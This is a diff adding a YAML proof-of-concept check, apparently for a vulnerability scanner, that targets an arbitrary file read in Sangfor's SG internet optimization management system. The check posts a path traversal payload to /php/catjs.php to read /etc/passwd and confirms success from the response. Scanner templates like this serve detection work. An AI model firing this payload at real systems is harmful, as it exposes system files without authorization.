@@ -1,0 +1,17 @@
+id: poc-yaml-sangfor-sg-management-system-arbitrary-file-read
+info:
+  name: 深信服-SG上网优化管理系统-任意文件读取漏洞
+  severity: critical
+  tags:
+  - 文件读取
+  finger: SG上网优化管理系统
+requests:
+- method: POST
+  path: /php/catjs.php
+  data: '["../../../../../../etc/passwd"]
+
+    '
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+variables: {}
+transport: http
